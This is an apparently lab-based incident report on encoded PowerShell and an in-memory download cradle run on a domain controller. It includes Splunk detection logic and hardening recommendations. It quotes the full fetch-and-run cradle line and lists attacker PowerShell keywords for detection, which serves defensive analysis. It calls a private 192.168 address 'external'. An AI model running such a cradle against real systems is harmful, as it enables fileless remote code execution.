# IR-005: Suspicious PowerShell Activity

| Field       | Value                                             |
| ----------- | ------------------------------------------------- |
| Incident ID | IR-005                                            |
| Severity    | High                                              |
| Status      | Closed                                            |
| Detected    | 2026-05-28 05:30 UTC                              |
| Reported by | Splunk detection (PowerShell Operational, Sysmon) |
| Analyst     | Michael Chaudhary                                 |
| MITRE       | T1059.001, T1027, T1027.010                       |

## Summary

PowerShell on `DC01` ran a base64 encoded command and an in memory download cradle (`IEX (New-Object Net.WebClient).DownloadString`) under the account `corp\john.smith` inside an Evil-WinRM session. Both patterns are commonly associated with attacker post exploitation activity rather than normal administrative use. Script Block Logging captured the decoded content of the encoded command, confirming the obfuscation did not hide the intent.

## Detection

- Event 4104 (Script Block Logging) captured the encoded command in fully decoded form. The recorded script block was `Write-Output "Encoded command executed"`, with subject `CORP\john.smith` on `DC01`.
- A second 4104 captured the download cradle, showing the full `IEX (New-Object Net.WebClient).DownloadString('http://192.168.40.130:8080/test.ps1')` string.
- Sysmon Event 1 (Process Create) on the workstation recorded `whoami.exe` spawned by `powershell.exe`, with command line, hashes, and parent user `CORP\john.smith` captured.
- Splunk search: `index=Powershell_Op EventCode=4104 ("DownloadString" OR "EncodedCommand" OR "IEX")` surfaced the events.

## Timeline (UTC)

| Time         | Activity                                                                        |
| ------------ | ------------------------------------------------------------------------------- |
| 05:30:04     | 4104: `Write-Output "Encoded command executed"` (decoded form of base64 input). |
| 05:30 approx | 4104: download cradle pulling `test.ps1` from 192.168.40.130:8080.              |
| 05:30 approx | Sysmon EID 1: `whoami.exe` spawned by `powershell.exe`.                         |

## Impact

- PowerShell ran on the domain controller under a domain user account that now holds elevated privileges (see IR-003).
- The in memory download cradle pulled and executed a script from an external IP without writing to disk. The script in this incident was a harmless test payload, but the pattern is the same one attackers use for fileless execution of real malware.
- The encoded command demonstrated that base64 obfuscation passes through PowerShell unchanged. Without Script Block Logging this command would have been visible only as a long base64 string in process logs, which is significantly harder to triage.
- No persistence mechanism or follow on payload was observed within this incident window.

## Indicators of Compromise (IOCs)

- Account running PowerShell: `corp\john.smith`
- Host: `DC01.corp.local`
- External IP contacted by download cradle: `192.168.40.130:8080`
- Patterns observed in 4104: `IEX`, `New-Object Net.WebClient`, `DownloadString`, `EncodedCommand`
- Parent process pattern (Sysmon EID 1): `powershell.exe` spawning `whoami.exe`
- Related incidents: IR-001 (initial credential compromise), IR-003 (privilege escalation of `john.smith`)

## Recommendations

1. Force a password reset on `john.smith` and disable the account pending review. The account has now been used for credential access, privilege escalation, and code execution on the DC.
2. Block outbound connections from the DC to `192.168.40.130:8080`. Domain controllers should generally not initiate outbound HTTP to arbitrary external addresses.
3. Audit any further outbound network connections initiated by `powershell.exe` on the DC over the past 24 hours. Domain controllers running download cradles is high signal.
4. Verify that PowerShell Script Block Logging and Module Logging are enabled across all hosts, not just the DC. The current detection only worked because logging was enabled, and these settings are off by default.
5. Add detection rules that look for known malicious PowerShell patterns in `ScriptBlockText`: `IEX`, `Invoke-Expression`, `DownloadString`, `FromBase64String`, `-EncodedCommand`, `-nop`. These strings are rare in legitimate use and very common in attacker tooling.
6. Add a Sysmon based detection for `ParentImage` containing `powershell.exe` spawning sensitive children (`whoami.exe`, `net.exe`, `reg.exe`, `certutil.exe`, `bitsadmin.exe`).

## Status

- Closed.
- Detection coverage takeaway: 4104 captures script content even when obfuscated, which is what makes it useful against base64 encoded commands. Sysmon Event 1 adds the parent process chain that 4104 alone does not show. The two together give a much fuller picture than either in isolation.
- Open item for follow up: PowerShell Operational events are not forwarded to Splunk by default. The forwarder configuration on every host should be reviewed to confirm this channel is being collected, since the same gap likely exists on workstations and member servers.
